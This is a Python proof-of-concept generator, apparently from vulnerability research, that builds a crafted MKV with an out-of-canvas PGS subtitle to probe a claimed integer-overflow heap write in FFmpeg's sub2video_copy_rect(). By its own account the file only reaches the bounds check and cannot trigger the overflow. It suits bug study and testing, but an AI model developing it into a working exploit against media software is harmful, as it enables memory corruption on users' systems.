#!/usr/bin/env python3
"""
vuln_001_gen.py - Generate crafted MKV with PGS (HDMV) bitmap subtitle
targeting sub2video_copy_rect() in fftools/ffmpeg_filter.c lines 308-336.

Vulnerability description:
  CWE-190 -> CWE-787: In sub2video_copy_rect(), the check
    if (r->x + r->w > w)
  uses signed int addition without overflow protection. If r->x is near
  INT_MAX and r->w is positive, the addition overflows to a negative value,
  bypassing the bounds check. Then dst += r->x * 4 also overflows, causing
  the dst pointer to move before the buffer, and subsequent pixel writes
  cause heap OOB write.

Trigger condition limitation:
  All standard subtitle formats (DVB, PGS, DVDSUB, XSUB) use at most 16-bit
  coordinate fields. Maximum achievable r->x = 65535, r->w = 65535, giving
  sum 131070 - far below INT_MAX (2147483647). Therefore the signed integer
  overflow described in the vulnerability cannot be triggered via standard
  subtitle bitstreams without a custom/patched decoder.

This PoC:
  - Creates a valid MKV with PGS (S_HDMV/PGS) bitmap subtitle
  - Uses maximum 16-bit coordinates (x=65000, y=65000) to exercise the path
  - The bounds check at line 319 correctly catches the out-of-bounds rect and
    returns early (logs "sub2video: rectangle (...) overflowing 320 240")
  - Demonstrates the sub2video_copy_rect code path IS reachable
"""
import struct
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.mkv')

# ─── EBML helpers ───────────────────────────────────────────────────────────

def encode_vint(n):
    """Encode n as EBML VINT (for element data size)."""
    if n < 0x7F:
        return bytes([n | 0x80])
    elif n < 0x3FFF:
        return struct.pack('>H', n | 0x4000)
    elif n < 0x1FFFFF:
        b = struct.pack('>I', n | 0x200000)
        return b[1:]
    elif n < 0x0FFFFFFF:
        return struct.pack('>I', n | 0x10000000)
    else:
        b = struct.pack('>Q', n | 0x100000000000000)
        return b

def encode_id(eid):
    """Encode element ID (already has VINT marker bits)."""
    if eid <= 0xFF:
        return bytes([eid])
    elif eid <= 0xFFFF:
        return struct.pack('>H', eid)
    elif eid <= 0xFFFFFF:
        return struct.pack('>I', eid)[1:]
    else:
        return struct.pack('>I', eid)

def elem(eid, data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return encode_id(eid) + encode_vint(len(data)) + data

def uint_elem(eid, val, nbytes=None):
    if val == 0:
        data = b'\x00'
    else:
        n, nb = val, 0
        while n:
            n >>= 8; nb += 1
        data = val.to_bytes(nbytes or nb, 'big')
    return elem(eid, data)

def float_elem(eid, val):
    return elem(eid, struct.pack('>d', val))

# ─── MKV element IDs ─────────────────────────────────────────────────────────

EBML_HDR   = 0x1A45DFA3; EBML_VER  = 0x4286; EBML_RVER = 0x42F7
EBML_MIDL  = 0x42F2;     EBML_MSZL = 0x42F3; EBML_DT   = 0x4282
EBML_DTV   = 0x4287;     EBML_DTRV = 0x4285

SEG = 0x18538067; INFO = 0x1549A966; TCSCALE = 0x2AD7B1; DUR = 0x4489
MAPP = 0x4D80; WAPP = 0x5741

TRACKS = 0x1654AE6B; TENTRY = 0xAE; TNUM = 0xD7; TUID = 0x73C5
TTYPE = 0x83; FENA = 0xB9; FDEF = 0x88; FLAC = 0x9C
CODEC_ID = 0x86; CODEC_PV = 0x63A2; VIDEO = 0xE0; PW = 0xB0; PH = 0xBA

CLUSTER = 0x1F43B675; TC = 0xE7; BG = 0xA0; BLK = 0xA1
BDUR = 0x9B; SBLK = 0xA3

# ─── Block/SimpleBlock helpers ────────────────────────────────────────────────

def simple_block(track, timecode_ms, keyframe, data):
    flags = 0x80 if keyframe else 0x00
    hdr = encode_vint(track) + struct.pack('>HB', timecode_ms, flags)
    return elem(SBLK, hdr + data)

def block_group(track, timecode_ms, dur_ms, data):
    flags = 0x80
    hdr = encode_vint(track) + struct.pack('>HB', timecode_ms, flags)
    blk = elem(BLK, hdr + data)
    return elem(BG, uint_elem(BDUR, dur_ms) + blk)

# ─── PGS (HDMV) subtitle format ──────────────────────────────────────────────
# In MKV (S_HDMV/PGS), each block contains raw PGS segments WITHOUT the Blu-ray
# PES header ("PG" + PTS + DTS). Segments are: type(1) + length(2) + data.
# Reference: FFmpeg pgssubdec.c line 626-627 reads segment_type then segment_length.

def pgs_seg(seg_type, data):
    """Build a single raw PGS segment for embedding in MKV blocks."""
    return bytes([seg_type]) + struct.pack('>H', len(data)) + data

def pgs_display_set(video_w, video_h, sub_x, sub_y):
    """
    Create a minimal PGS display set (one block's worth of segments).
    Object is a 2x2 pixel bitmap placed at (sub_x, sub_y).
    Coordinates clipped to 16-bit (PGS format limit).
    """
    obj_id = 1; pal_id = 1; win_id = 0
    obj_w = 2; obj_h = 2   # actual rendered object dimensions

    sub_x = sub_x & 0xFFFF
    sub_y = sub_y & 0xFFFF

    # PCS (0x16): Presentation Composition Segment
    # video_w(2) video_h(2) frame_rate(1) comp_num(2) comp_state(1)
    # palette_update_flag(1) palette_id(1) obj_count(1)
    # [per object: obj_id(2) win_id(1) flags(1) x(2) y(2)]
    pcs = struct.pack('>HHBHB', video_w, video_h, 0x10, 0, 0x00)
    pcs += bytes([0, pal_id, 1])    # palette_update=0, palette_id, obj_count=1
    pcs += struct.pack('>HBBHH', obj_id, win_id, 0x00, sub_x, sub_y)

    # WDS (0x17): Window Definition Segment
    wds = bytes([1])                 # window_count
    wds += struct.pack('>BHHHH', win_id, sub_x, sub_y, obj_w, obj_h)

    # PDS (0x14): Palette Definition Segment
    pds = bytes([pal_id, 0])         # palette_id, version
    pds += bytes([0, 16, 128, 128,   0])   # entry 0: transparent
    pds += bytes([1, 235, 128, 128, 255])  # entry 1: white opaque

    # ODS (0x15): Object Definition Segment
    # RLE-encoded 2x2 object: each row ends with 0x00 0x00 (EOL)
    # RLE encoding: color_id=1, run_length implies 2 pixels
    # 0x02 = color 1, 1 pixel; 0x01 = color 1, 1 pixel; 0x00 0x00 = EOL
    rle = bytes([0x02, 0x02, 0x00, 0x00,   # row 1: 2 pixels white, EOL
                 0x02, 0x02, 0x00, 0x00])  # row 2: 2 pixels white, EOL
    data_len = 4 + len(rle)       # w(2)+h(2)+rle
    ods = struct.pack('>HBB', obj_id, 0, 0xC0)   # id, version, seq=first+last
    ods += bytes([(data_len >> 16) & 0xFF, (data_len >> 8) & 0xFF, data_len & 0xFF])
    ods += struct.pack('>HH', obj_w, obj_h)
    ods += rle

    # END (0x80): End of Display Set
    return (pgs_seg(0x16, pcs) + pgs_seg(0x17, wds) +
            pgs_seg(0x14, pds) + pgs_seg(0x15, ods) +
            pgs_seg(0x80, b''))

def pgs_clear(video_w, video_h):
    """Create an empty PGS display set (clear/hide subtitle)."""
    pcs = struct.pack('>HHBHB', video_w, video_h, 0x10, 1, 0x00)
    pcs += bytes([0, 1, 0])    # palette_update=0, palette_id=1, obj_count=0
    return pgs_seg(0x16, pcs) + pgs_seg(0x80, b'')

# ─── Minimal MJPEG frame ──────────────────────────────────────────────────────

def minimal_mjpeg_2x2():
    """Return bytes of a minimal valid 2x2 grayscale MJPEG."""
    return bytes([
        0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,
        0x01,0x00,0x00,0x01,0x00,0x01,0x00,0x00,
        0xFF,0xDB,0x00,0x43,0x00,
        0x10,0x0B,0x0C,0x0E,0x0C,0x0A,0x10,0x0E,0x0D,0x0E,0x12,0x11,
        0x10,0x13,0x18,0x28,0x1A,0x18,0x16,0x16,0x18,0x31,0x23,0x25,
        0x1D,0x28,0x3A,0x33,0x3D,0x3C,0x39,0x33,0x38,0x37,0x40,0x48,
        0x5C,0x4E,0x40,0x44,0x57,0x45,0x37,0x38,0x50,0x6D,0x51,0x57,
        0x5F,0x62,0x67,0x68,0x67,0x3E,0x4D,0x71,0x79,0x70,0x64,0x78,
        0x5C,0x65,0x67,0x63,
        0xFF,0xC0,0x00,0x0B,0x08,0x00,0x02,0x00,0x02,0x01,0x01,0x11,0x00,
        0xFF,0xC4,0x00,0x1F,0x00,
        0x00,0x01,0x05,0x01,0x01,0x01,0x01,0x01,0x01,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,
        0x08,0x09,0x0A,0x0B,
        0xFF,0xC4,0x00,0xB5,0x10,
        0x00,0x02,0x01,0x03,0x03,0x02,0x04,0x03,0x05,0x05,0x04,0x04,
        0x00,0x00,0x01,0x7D,0x01,0x02,0x03,0x00,0x04,0x11,0x05,0x12,
        0x21,0x31,0x41,0x06,0x13,0x51,0x61,0x07,0x22,0x71,0x14,0x32,
        0x81,0x91,0xA1,0x08,0x23,0x42,0xB1,0xC1,0x15,0x52,0xD1,0xF0,
        0x24,0x33,0x62,0x72,0x82,0x09,0x0A,0x16,0x17,0x18,0x19,0x1A,
        0x25,0x26,0x27,0x28,0x29,0x2A,0x34,0x35,0x36,0x37,0x38,0x39,
        0x3A,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x53,0x54,0x55,
        0x56,0x57,0x58,0x59,0x5A,0x63,0x64,0x65,0x66,0x67,0x68,0x69,
        0x6A,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7A,0x83,0x84,0x85,
        0x86,0x87,0x88,0x89,0x8A,0x92,0x93,0x94,0x95,0x96,0x97,0x98,
        0x99,0x9A,0xA2,0xA3,0xA4,0xA5,0xA6,0xA7,0xA8,0xA9,0xAA,0xB2,
        0xB3,0xB4,0xB5,0xB6,0xB7,0xB8,0xB9,0xBA,0xC2,0xC3,0xC4,0xC5,
        0xC6,0xC7,0xC8,0xC9,0xCA,0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,0xD8,
        0xD9,0xDA,0xE1,0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,0xE8,0xE9,0xEA,
        0xF1,0xF2,0xF3,0xF4,0xF5,0xF6,0xF7,0xF8,0xF9,0xFA,
        0xFF,0xDA,0x00,0x08,0x01,0x01,0x00,0x00,0x3F,0x00,
        0xFB,0x08,0x28,0xA2,0x80,
        0xFF,0xD9
    ])

# ─── Build MKV ────────────────────────────────────────────────────────────────

def create_mkv(output_path):
    VIDEO_W, VIDEO_H = 320, 240

    # Subtitle x,y coordinates (max 16-bit in PGS = 65535)
    # These are far outside the 320x240 video canvas, triggering the
    # bounds-check log at line 319-323 in sub2video_copy_rect.
    SUB_X = 65000
    SUB_Y = 65000

    # EBML header
    hdr_data = (
        uint_elem(EBML_VER, 1) + uint_elem(EBML_RVER, 1) +
        uint_elem(EBML_MIDL, 4) + uint_elem(EBML_MSZL, 8) +
        elem(EBML_DT, 'matroska') +
        uint_elem(EBML_DTV, 4) + uint_elem(EBML_DTRV, 2)
    )
    header = elem(EBML_HDR, hdr_data)

    # Info
    info_data = (
        uint_elem(TCSCALE, 1000000) +         # 1 ms per timecode unit
        float_elem(DUR, 3000.0) +             # 3 seconds
        elem(MAPP, 'vuln_poc_001') +
        elem(WAPP, 'vuln_poc_001')
    )
    info = elem(INFO, info_data)

    # Video track
    video_e = uint_elem(PW, VIDEO_W) + uint_elem(PH, VIDEO_H)
    vid_track = (
        uint_elem(TNUM, 1) + uint_elem(TUID, 111) +
        uint_elem(TTYPE, 1) +              # video
        uint_elem(FENA, 1) + uint_elem(FDEF, 1) + uint_elem(FLAC, 0) +
        elem(CODEC_ID, 'V_MJPEG') +
        elem(VIDEO, video_e)
    )

    # PGS subtitle track (S_HDMV/PGS)
    sub_track = (
        uint_elem(TNUM, 2) + uint_elem(TUID, 222) +
        uint_elem(TTYPE, 17) +             # subtitle
        uint_elem(FENA, 1) + uint_elem(FDEF, 0) + uint_elem(FLAC, 0) +
        elem(CODEC_ID, 'S_HDMV/PGS')
    )

    tracks = elem(TRACKS,
                  elem(TENTRY, vid_track) + elem(TENTRY, sub_track))

    # Content
    frame = minimal_mjpeg_2x2()

    # PGS display set at t=0ms: subtitle at (65000, 65000) - way outside 320x240
    pgs_show = pgs_display_set(VIDEO_W, VIDEO_H, SUB_X, SUB_Y)
    # PGS clear at t=2000ms
    pgs_cl   = pgs_clear(VIDEO_W, VIDEO_H)

    cluster_data = (
        uint_elem(TC, 0) +
        simple_block(1, 0,    True, frame) +
        block_group(2, 0,    2000, pgs_show) +
        simple_block(1, 1000, True, frame) +
        simple_block(1, 2000, True, frame) +
        block_group(2, 2000,  500, pgs_cl)
    )
    cluster = elem(CLUSTER, cluster_data)

    segment = elem(SEG, info + tracks + cluster)
    mkv = header + segment

    with open(output_path, 'wb') as f:
        f.write(mkv)

    print(f"[+] Generated: {output_path} ({len(mkv)} bytes)")
    print(f"    Video:    {VIDEO_W}x{VIDEO_H} MJPEG (V_MJPEG)")
    print(f"    Subtitle: S_HDMV/PGS, position x={SUB_X} y={SUB_Y}")
    print()
    print("[!] LIMITATION: PGS format uses 16-bit coordinates (max 65535).")
    print("    Integer overflow in sub2video_copy_rect requires r->x near INT_MAX.")
    print("    This PoC exercises the sub2video code path and demonstrates the")
    print("    bounds-check log at ffmpeg_filter.c:319-323, but cannot trigger")
    print("    the actual signed int overflow without a custom subtitle decoder.")


if __name__ == '__main__':
    create_mkv(OUTPUT)
